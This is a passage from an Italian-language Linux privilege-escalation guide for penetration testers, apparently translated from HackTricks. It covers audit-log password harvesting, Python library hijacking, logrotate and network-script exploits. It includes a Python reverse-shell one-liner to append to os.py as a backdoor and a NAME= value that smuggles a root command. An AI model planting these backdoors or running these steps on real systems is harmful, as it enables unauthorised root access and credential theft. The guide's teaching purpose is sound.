Inoltre, alcuni registri di **audit "cattivi"** configurati (backdoor?) potrebbero permetterti di **registrare password** all'interno dei registri di audit come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Per **leggere i log** il gruppo [**adm**](gruppi-interessanti-linux-pe/#gruppo-adm) sarà davvero utile.

### File della shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Ricerca generica delle credenziali/Regex

Dovresti anche controllare i file che contengono la parola "**password**" nel **nome** o all'interno del **contenuto**, e controllare anche gli IP e le email nei log, o tramite espressioni regolari per gli hash.\
Non elencherò qui come fare tutto questo, ma se sei interessato puoi controllare gli ultimi controlli che [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) esegue.

## File scrivibili

### Dirottamento della libreria Python

Se sai da **dove** uno script python verrà eseguito e **puoi scrivere all'interno** di quella cartella o **modificare le librerie python**, puoi modificare la libreria del sistema operativo e inserirci un backdoor (se puoi scrivere dove lo script python verrà eseguito, copia e incolla la libreria os.py).

Per **inserire un backdoor nella libreria**, aggiungi alla fine della libreria os.py la seguente riga (cambia IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Sfruttamento di Logrotate

Una vulnerabilità in `logrotate` consente agli utenti con **permessi di scrittura** su un file di registro o sulle directory genitori di potenzialmente ottenere privilegi elevati. Questo perché `logrotate`, spesso in esecuzione come **root**, può essere manipolato per eseguire file arbitrari, specialmente in directory come _**/etc/bash\_completion.d/**_. È importante controllare i permessi non solo in _/var/log_ ma anche in qualsiasi directory in cui viene applicata la rotazione dei log.

{% hint style="info" %}
Questa vulnerabilità riguarda la versione `3.18.0` e precedenti di `logrotate`
{% endhint %}

Ulteriori informazioni dettagliate sulla vulnerabilità possono essere trovate su questa pagina: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

È possibile sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).

Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(registri di nginx),** quindi ogni volta che scopri di poter modificare i log, controlla chi gestisce quei log e verifica se puoi ottenere privilegi sostituendo i log con symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Riferimento alla vulnerabilità:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, per qualsiasi motivo, un utente è in grado di **scrivere** uno script `ifcf-<qualunque cosa>` in _/etc/sysconfig/network-scripts_ **o** può **modificare** uno già esistente, allora il **sistema è compromesso**.

Gli script di rete, ad esempio _ifcg-eth0_, sono utilizzati per le connessioni di rete. Assomigliano esattamente ai file .INI. Tuttavia, vengono \~sourced\~ su Linux dal Network Manager (dispatcher.d).

Nel mio caso, l'attributo `NAME=` in questi script di rete non è gestito correttamente. Se hai **spazi bianchi nel nome, il sistema cerca di eseguire la parte dopo lo spazio bianco**. Questo significa che **tutto ciò che segue il primo spazio bianco viene eseguito come root**.

Ad esempio: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd e rc.d**

La directory `/etc/init.d` ospita **script** per System V init (SysVinit), il **sistema classico di gestione dei servizi Linux**. Include script per `avviare`, `fermare`, `riavviare` e talvolta `ricaricare` servizi. Questi possono essere eseguiti direttamente o tramite link simbolici trovati in `/etc/rc?.d/`. Un percorso alternativo nei sistemi Redhat è `/etc/rc.d/init.d`.

D'altra parte, `/etc/init` è associato a **Upstart**, un sistema di **gestione dei servizi più recente** introdotto da Ubuntu, che utilizza file di configurazione per compiti di gestione dei servizi. Nonostante il passaggio a Upstart, gli script SysVinit sono ancora utilizzati insieme alle configurazioni Upstart grazie a uno strato di compatibilità in Upstart.

**systemd** emerge come un moderno inizializzatore e gestore di servizi, offrendo funzionalità avanzate come l'avvio su richiesta dei daemon, la gestione dell'automount e gli snapshot dello stato di sistema. Organizza i file in `/usr/lib/systemd/` per i pacchetti di distribuzione e in `/etc/systemd/system/` per le modifiche degli amministratori, semplificando il processo di amministrazione di sistema.
